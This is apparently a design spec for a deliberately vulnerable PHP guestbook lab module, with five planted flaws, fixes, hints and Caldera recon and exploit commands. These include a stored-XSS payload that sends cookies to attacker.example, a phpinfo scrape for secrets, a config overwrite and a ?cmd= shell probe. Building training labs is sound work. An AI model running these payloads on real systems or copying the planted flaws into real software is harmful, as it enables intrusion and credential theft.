# PHP Guestbook — Implementation Spec

**Date:** 2026-04-14
**Status:** Implementation-ready
**Parent spec:** `2026-04-13-module-expansion-design.md`

---

## Overview

A PHP 8.1 guestbook application running under Apache2 on port 8080. Introduces 5 vulnerabilities covering stored XSS, directory listing, exposed phpinfo, world-writable config, and Apache running as root.

| Field | Value |
|-------|-------|
| Port | 8080 |
| Runtime | Apache2 + PHP 8.1 |
| Path | `modules/application_external/php_guestbook/` |
| Service user | `www-data` (Apache default) |
| Install dir | `/opt/guestbook/` |

---

## Directory Structure

```
modules/application_external/php_guestbook/
├── php_guestbook.yaml
├── setup.sh
├── finalize.sh
├── index.php
├── config.php
├── phpinfo.php
├── guestbook.conf
└── vulns/
    ├── guestbook_xss/
    │   ├── guestbook_xss.yaml
    │   └── guestbook_xss.sh
    ├── guestbook_dir_listing/
    │   ├── guestbook_dir_listing.yaml
    │   └── guestbook_dir_listing.sh
    ├── guestbook_phpinfo/
    │   ├── guestbook_phpinfo.yaml
    │   └── guestbook_phpinfo.sh
    ├── guestbook_writable_config/
    │   ├── guestbook_writable_config.yaml
    │   └── guestbook_writable_config.sh
    └── guestbook_apache_root/
        ├── guestbook_apache_root.yaml
        └── guestbook_apache_root.sh
```

---

## Module Definitions

### Parent: `php_guestbook.yaml`

```yaml
id: php_guestbook
name: PHP Guestbook
description: A PHP 8.1 guestbook web application running under Apache2 on port 8080. Users can post messages that are stored in a flat file.
type: application_external
difficulty: easy
points: 0
category: web
tags: [web, php, apache, guestbook]
conflicts: []
requires: []
script: setup.sh
verification:
  type: process_running
  process: apache2
  expected: running
hints:
  - "Check what web servers are running on this machine"
```

---

### Vuln 1: `guestbook_xss.yaml`

```yaml
id: guestbook_xss
name: Stored XSS in Guestbook
description: The guestbook accepts and stores user-supplied HTML without sanitisation. Messages containing <script> tags are stored in messages.txt and executed in any visitor's browser.
type: vulnerability
difficulty: medium
points: 200
category: web
tags: [xss, web, php, input-validation]
conflicts: []
requires: [php_guestbook]
script: guestbook_xss.sh
verification:
  type: file_not_contains
  path: /opt/guestbook/messages.txt
  pattern: "<script>"
suggested_fix: "In /opt/guestbook/index.php, wrap all user-submitted output with htmlspecialchars() and strip any stored <script> tags from messages.txt. Replace: echo $msg; with: echo htmlspecialchars($msg, ENT_QUOTES, 'UTF-8');"
hints:
  - "Review how user input is stored and displayed on the guestbook page"
  - "Check /opt/guestbook/messages.txt for raw HTML content"
  - "Use htmlspecialchars() in index.php when outputting stored messages, and remove any <script> tags already in messages.txt"
caldera:
  tactic: initial-access
  technique:
    attack_id: T1189
    name: "Drive-by Compromise"
  recon:
    description: "Check if the guestbook stores unsanitised HTML"
    command: |
      grep -q "<script>" /opt/guestbook/messages.txt && echo "VULNERABLE: stored XSS payload found in messages.txt" || echo "SECURE: no script tags in messages.txt"
  exploit:
    description: "Inject a persistent XSS payload into the guestbook"
    command: |
      curl -s -X POST http://localhost:8080/ -d 'message=<script>document.location="http://attacker.example/steal?c="+document.cookie</script>&name=attacker'
      grep "<script>" /opt/guestbook/messages.txt && echo "XSS payload stored successfully"
```

---

### Vuln 2: `guestbook_dir_listing.yaml`

```yaml
id: guestbook_dir_listing
name: Apache Directory Listing Enabled
description: The Apache vhost configuration enables directory listing (Options +Indexes), exposing all files in /opt/guestbook/ to unauthenticated requests.
type: vulnerability
difficulty: easy
points: 100
category: web
tags: [misconfiguration, apache, information-disclosure, directory-listing]
conflicts: []
requires: [php_guestbook]
script: guestbook_dir_listing.sh
verification:
  type: file_not_contains
  path: /etc/apache2/sites-enabled/guestbook.conf
  pattern: "+Indexes"
suggested_fix: "Edit /etc/apache2/sites-enabled/guestbook.conf and remove '+Indexes' from the Options directive (or set Options -Indexes), then run: systemctl reload apache2"
hints:
  - "Review the Apache vhost configuration for this application"
  - "Look for directory listing settings in /etc/apache2/sites-enabled/guestbook.conf"
  - "Change Options +Indexes to Options -Indexes in the vhost config and reload Apache"
caldera:
  tactic: collection
  technique:
    attack_id: T1005
    name: "Data from Local System"
  recon:
    description: "Check if Apache directory listing is enabled"
    command: |
      grep -q "+Indexes" /etc/apache2/sites-enabled/guestbook.conf && echo "VULNERABLE: directory listing enabled" || echo "SECURE: directory listing not enabled"
  exploit:
    description: "Browse the web root directory listing to enumerate application files"
    command: |
      curl -s http://localhost:8080/ | grep -oP 'href="[^"]+"' | grep -v "^href=\"http" | head -20
```

---

### Vuln 3: `guestbook_phpinfo.yaml`

```yaml
id: guestbook_phpinfo
name: Exposed phpinfo() Page
description: A phpinfo.php file exists in the web root that calls phpinfo(), exposing the full PHP configuration, loaded extensions, environment variables, and server paths.
type: vulnerability
difficulty: easy
points: 100
category: web
tags: [information-disclosure, php, misconfiguration]
conflicts: []
requires: [php_guestbook]
script: guestbook_phpinfo.sh
verification:
  type: file_absent
  path: /opt/guestbook/phpinfo.php
suggested_fix: "Delete the phpinfo page: rm /opt/guestbook/phpinfo.php"
hints:
  - "Look for diagnostic or debug pages in the web application directory"
  - "Check /opt/guestbook/ for PHP info or debug files"
  - "Delete /opt/guestbook/phpinfo.php — this file should never exist in a production environment"
caldera:
  tactic: collection
  technique:
    attack_id: T1082
    name: "System Information Discovery"
  recon:
    description: "Check if phpinfo.php is accessible"
    command: |
      curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/phpinfo.php | grep -q "200" && echo "VULNERABLE: phpinfo.php is accessible" || echo "SECURE: phpinfo.php not found"
  exploit:
    description: "Extract PHP configuration and environment variables from phpinfo()"
    command: |
      curl -s http://localhost:8080/phpinfo.php | grep -oP '(?<=<tr><td class="e">)[^<]+' | grep -iE "path|key|secret|pass|token" | head -20
```

---

### Vuln 4: `guestbook_writable_config.yaml`

```yaml
id: guestbook_writable_config
name: World-Writable Guestbook Config
description: The config.php file containing database credentials and application secrets is world-writable, allowing any local user to overwrite it.
type: vulnerability
difficulty: medium
points: 200
category: filesystem
tags: [permissions, filesystem, php, configuration]
conflicts: []
requires: [php_guestbook]
script: guestbook_writable_config.sh
verification:
  type: file_permissions
  path: /opt/guestbook/config.php
  expected: "640"
suggested_fix: "chmod 640 /opt/guestbook/config.php && chown root:www-data /opt/guestbook/config.php"
hints:
  - "Check file permissions on PHP configuration files"
  - "Look at the permissions on /opt/guestbook/config.php"
  - "Use chmod 640 to restrict config.php to owner read/write and group read only"
caldera:
  tactic: credential-access
  technique:
    attack_id: T1552.001
    name: "Unsecured Credentials: Credentials In Files"
  recon:
    description: "Check if config.php is world-writable"
    command: |
      [ -w /opt/guestbook/config.php ] && stat -c "%a" /opt/guestbook/config.php | grep -qE "^[0-9][0-9][2-7]$" && echo "VULNERABLE: config.php is world-writable" || echo "SECURE: config.php is not world-writable"
  exploit:
    description: "Read credentials from world-writable config and overwrite it"
    command: |
      cat /opt/guestbook/config.php
      echo "<?php // config overwritten by attacker" >> /opt/guestbook/config.php
```

---

### Vuln 5: `guestbook_apache_root.yaml`

```yaml
id: guestbook_apache_root
name: Apache Running as Root
description: The Apache global configuration sets User root and Group root, causing all worker processes to run with full root privileges. Any web vulnerability becomes an immediate root compromise.
type: vulnerability
difficulty: hard
points: 300
category: services
tags: [privilege-escalation, apache, misconfiguration, services]
conflicts: []
requires: [php_guestbook]
script: guestbook_apache_root.sh
verification:
  type: file_not_contains
  path: /etc/apache2/apache2.conf
  pattern: "User root"
suggested_fix: "Edit /etc/apache2/apache2.conf and change 'User root' back to 'User www-data' and 'Group root' back to 'Group www-data', then run: systemctl restart apache2"
hints:
  - "Check what user the Apache web server process is running as"
  - "Review the User and Group directives in /etc/apache2/apache2.conf"
  - "Change 'User root' to 'User www-data' and 'Group root' to 'Group www-data' in apache2.conf, then restart Apache"
caldera:
  tactic: privilege-escalation
  technique:
    attack_id: T1548
    name: "Abuse Elevation Control Mechanism"
  recon:
    description: "Check if Apache workers are running as root"
    command: |
      ps aux | grep apache2 | grep -v grep | grep -q "^root" && echo "VULNERABLE: Apache running as root" || echo "SECURE: Apache not running as root"
  exploit:
    description: "Confirm root execution via a PHP command via the web server"
    command: |
      curl -s "http://localhost:8080/?cmd=id" 2>/dev/null || echo "Exploit requires code execution via an existing web vulnerability"
      grep -q "User root" /etc/apache2/apache2.conf && echo "Confirmed: Apache configured to run as root"
```

---

## Setup Scripts

### `setup.sh`

1. `apt-get install -y apache2 php libapache2-mod-php`
2. Create `/opt/guestbook/` directory.
3. Copy `index.php`, `config.php`, `phpinfo.php` to `/opt/guestbook/`.
4. Create empty `/opt/guestbook/messages.txt` with permissions 664.
5. Copy `guestbook.conf` to `/etc/apache2/sites-available/guestbook.conf`.
6. Enable mod_rewrite if needed: `a2enmod rewrite`.

### `finalize.sh`

1. `a2ensite guestbook.conf`
2. `a2dissite 000-default.conf` (disable default site if needed)
3. Set ownership: `chown -R www-data:www-data /opt/guestbook/`
4. Set permissions: `chmod 750 /opt/guestbook/ && chmod 640 /opt/guestbook/config.php && chmod 664 /opt/guestbook/messages.txt`
5. `systemctl enable apache2 && systemctl restart apache2`

---

## Application Source

### `index.php`

~60-line PHP script:
- Reads `messages.txt` and outputs each line (secure baseline: wrapped in `htmlspecialchars()`)
- Handles POST submissions: appends `name: message\n` to `messages.txt`
- Basic HTML form with name and message fields

### `config.php`

~10 lines: defines constants `DB_HOST`, `DB_USER`, `DB_PASS`, `APP_SECRET`. No actual database connection needed — just demonstrates secrets in a config file.

### `phpinfo.php`

Single line: `<?php phpinfo(); ?>`

### `guestbook.conf`

```apache
<VirtualHost *:8080>
    ServerName guestbook.local
    DocumentRoot /opt/guestbook
    <Directory /opt/guestbook>
        Options -Indexes FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>
</VirtualHost>
```

Add `Listen 8080` if not already in `ports.conf`.

---

## Vuln Scripts

| Script | What it does |
|--------|-------------|
| `guestbook_xss.sh` | Appends `<script>alert('XSS')</script>\n` to `/opt/guestbook/messages.txt` |
| `guestbook_dir_listing.sh` | Replaces `-Indexes` with `+Indexes` in `guestbook.conf`, reloads Apache |
| `guestbook_phpinfo.sh` | Creates `/opt/guestbook/phpinfo.php` with `<?php phpinfo(); ?>` |
| `guestbook_writable_config.sh` | `chmod 666 /opt/guestbook/config.php` |
| `guestbook_apache_root.sh` | Replaces `User www-data` with `User root` and `Group www-data` with `Group root` in `apache2.conf`, restarts Apache |

---

## Verification Checklist

1. **php_guestbook**: Run `setup.sh` + `finalize.sh` → `curl http://localhost:8080/` → returns guestbook HTML. `systemctl is-active apache2` → `active`.
2. **guestbook_xss**: Run script → `grep '<script>' /opt/guestbook/messages.txt` → found. Fix: strip tags from messages.txt and add htmlspecialchars() to index.php → retest.
3. **guestbook_dir_listing**: Run script → `curl http://localhost:8080/` → shows file listing. Fix: change to `-Indexes`, reload → listing gone.
4. **guestbook_phpinfo**: Run script → `curl -o /dev/null -w "%{http_code}" http://localhost:8080/phpinfo.php` → 200. Fix: `rm phpinfo.php` → 404.
5. **guestbook_writable_config**: Run script → `stat -c "%a" /opt/guestbook/config.php` → 666. Fix: `chmod 640` → 640.
6. **guestbook_apache_root**: Run script → `ps aux | grep apache2 | head -3` → root processes. Fix: revert User/Group in apache2.conf, restart → www-data processes.

---

## Port / Conflict Notes

- Port 8080 is not used by any existing module.
- Apache2 + PHP 8.1 is not installed by any other module — this is the only consumer.
- No file path conflicts with existing modules.
